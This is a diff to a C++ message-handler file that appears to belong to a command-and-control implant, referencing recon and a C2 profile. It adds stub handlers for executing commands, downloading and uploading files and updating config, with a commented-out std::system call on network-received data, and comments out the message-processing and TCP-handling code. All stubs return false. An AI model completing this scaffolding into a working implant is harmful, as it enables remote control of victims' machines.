@@ -6,16 +6,59 @@
 #include "MessagePublisher.h"
 #include "Recon.h"
 
+#include <cstdlib> // NOTE: needed to execute shell cmd
+
+
+
+
+bool MessageHandler::executeCommand(std::vector<uint8_t>& data)
+{
+	//return std::system(byte2string(data)); // returns non-zero on error
+	return false;
+}
+
+bool MessageHandler::downloadFile(std::vector<uint8_t>& data)
+{
+	return false;
+}
+
+bool MessageHandler::uploadFile(std::vector<uint8_t>& data)
+{
+	return false;
+}
+
+bool MessageHandler::updateConfig(std::vector<uint8_t>& data)
+{
+	return false;
+}
+
+bool MessageHandler::handleServerError(std::vector<uint8_t>& data)
+{
+	return false;
+}
+
+/*
+std::vector<uint8_t> MessageHandler::string2byte(std::string& inMsg)
+{
+	return std::vector<uint8_t>(inMsg.begin(), inMsg.end());
+}
+
+std::string MessageHandler::byte2string(std::vector<uint8_t>& inMsg)
+{
+	return std::string(inMsg.begin(), inMsg.end());
+}
+*/
 
 // this function processes the header of the message
 // to determine how to interpet the contents/data of 
 // the message. 
 //int processMessage(BYTE* payload, MessageHeader* header)
 // int processIncomingMessage(InternalMessage* msg, Config* config)
+/*
 bool MessageHandler::processMessage(InternalMessage* msg) // NOTE: passing the config around is actual cancer... i wish i was writing this in c++
 {
 	return true;
-	/*
+
 	switch (msg->header.messageType) {
 		case SYS_INFO:
 		{
@@ -39,12 +82,14 @@ bool MessageHandler::processMessage(InternalMessage* msg) // NOTE: passing the c
 
 		// ... other cases
 	}
-	return false;*/
+	return false;
 }
+*/
 
 
 //int receiveMessages(Config* config, FuncRecv pRecv) // TODO: figure out if passing pRecv is the best way to do this
 //bool MessageHandler::receiveMessages(uint8_t* buffer, size_t bytes_received, Config& config)
+/*
 bool MessageHandler::receiveMessages(uint8_t* buffer, size_t bytes_received)
 {
 	// TODO: replace 'true' with a condition
@@ -63,7 +108,7 @@ bool MessageHandler::receiveMessages(uint8_t* buffer, size_t bytes_received)
 
         InternalMessage resultMsg; // TODO: this needs to be initialized/allocated to be 0/NULL
 		//handleTCP(buffer, bytes_received, &resultMsg, config); // maybe rename to handleTCPInbound?
-		handleTCP(buffer, bytes_received, &resultMsg); // maybe rename to handleTCPInbound or handleConnection once polymorphic?
+		//handleTCP(buffer, bytes_received, &resultMsg); // maybe rename to handleTCPInbound or handleConnection once polymorphic?
 
 		//publisher
         //send(&resultMsg, config); // TODO: check return value for errors
@@ -80,8 +125,10 @@ bool MessageHandler::receiveMessages(uint8_t* buffer, size_t bytes_received)
 	}
 
 	return false; // if no errors, return 0
-}
+}*/
+
 //bool MessageHandler::handleTCP(uint8_t* rawData, size_t rawDataLength, InternalMessage* resultMsg, C2Profile* config)
+/*
 bool MessageHandler::handleTCP(uint8_t* rawData, size_t rawDataLength, InternalMessage* resultMsg)
 {
 	// Raw Bytes from Socket
@@ -122,7 +169,7 @@ bool MessageHandler::handleTCP(uint8_t* rawData, size_t rawDataLength, InternalM
 
 	// TODO: cleanup/free buf
 	return true;
-}
+}*/
 /*
 int handleHTTPS(uint8_t* data)
 {
